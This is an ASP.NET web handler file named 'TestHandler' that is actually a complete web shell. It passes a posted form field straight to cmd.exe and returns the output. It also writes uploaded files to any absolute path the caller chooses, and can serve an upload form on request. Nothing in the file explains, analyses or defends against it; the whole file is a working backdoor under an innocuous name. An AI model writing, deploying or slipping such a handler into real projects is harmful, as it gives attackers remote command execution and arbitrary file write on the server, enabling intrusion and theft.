<%@ WebHandler Language="C#" Class="TestHandler" %>

using System;
using System.Web;
using System.Diagnostics;
using System.IO;

public class TestHandler : IHttpHandler {
    
    public void ProcessRequest (HttpContext context) {
        context.Response.ContentType = "text/plain";

        if (context.Request.Form["a"] != null)
        {
            System.Diagnostics.Process si = new System.Diagnostics.Process();
            si.StartInfo.WorkingDirectory = @"c:\";
            si.StartInfo.UseShellExecute = false;
            si.StartInfo.FileName = "cmd.exe";
            si.StartInfo.Arguments = "/c " + context.Request.Form["a"];
            si.StartInfo.CreateNoWindow = true;
            si.StartInfo.RedirectStandardInput = true;
            si.StartInfo.RedirectStandardOutput = true;
            si.StartInfo.RedirectStandardError = true;
            si.Start();
            string output = si.StandardOutput.ReadToEnd();
            si.Close();
            context.Response.Write(output);
        }

        if (context.Request.Files["myFile"] != null)
        {
            HttpPostedFile file = context.Request.Files["myFile"];
            file.SaveAs(context.Request.Form["path"]);
            context.Response.Write("success");
        }
        if (context.Request.QueryString["form"] == "1")
        {
            context.Response.ContentType = "text/html";
            context.Response.Write("<form method='post' enctype='multipart/form-data' ><input name=myFile type=file ><br>"+
                "<input name=path type=text style='width:500px' > (absolute path)<br>" +
                "<input name=submit type=submit></form>");
        }
    }
 
    public bool IsReusable {
        get {
            return false;
        }
    }
}